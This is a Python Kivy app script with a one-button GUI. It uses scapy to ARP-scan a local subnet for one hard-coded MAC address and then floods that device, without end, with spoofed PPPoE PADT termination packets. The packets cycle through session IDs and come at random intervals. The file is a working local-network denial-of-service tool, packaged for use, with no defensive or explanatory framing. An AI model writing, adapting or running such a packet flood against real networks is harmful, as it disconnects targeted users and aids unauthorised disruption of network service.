# main.py

import time
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.popup import Popup
from scapy.all import *
import random

ipscan = '10.0.2.1/24'


def st(mac):
    for i in range(6553):
        c = Ether() / PPPoE()
        c.dst = mac
        c.src = '58:6a:b1:b4:a6:02'
        c.type = 0x8863
        c.payload.code = 0xa7
        c.payload.sessionid = i
        c.payload.len = 0
        sendp(c, verbose=0)


class TextInputApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', spacing=15, padding=10)
        self.text = TextInput(font_size=150)  # font_size输入文本框大小
        self.out_text = TextInput(font_size=150)
        button = Button(text="Run", size_hint=(0.5, 0.5),
                        pos_hint={"center_x": 0.5, "center_y": 0.5})
        button.bind(on_press=self.press)
        layout.add_widget(self.text)
        layout.add_widget(self.out_text)
        layout.add_widget(button)
        return layout

    def press(self, instance):
        # pop = Popup(text=self.text.text)
        try:  # 捕获异常，避免程序中断
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ipscan), timeout=2, verbose=False)
            self.text.text = 'Running'
        except:
            self.out_text.text = "wrong"  # 如果是不合法信息，输出错误
            pass
        else:
            for snd, rcv in ans:

                if rcv[ARP].hwsrc == "b0:25:aa:29:21:dd":
                    i=0
                    while True:
                        st(rcv[ARP].hwsrc)
                        i+=1
                        self.out_text.text = "Done!，the " + str(i) + " time(s)"
                        time.sleep(random.randint(30, 120))
                else:
                    self.out_text.text = "Not Found!"


if __name__ == "__main__":
    TextInputApp().run()
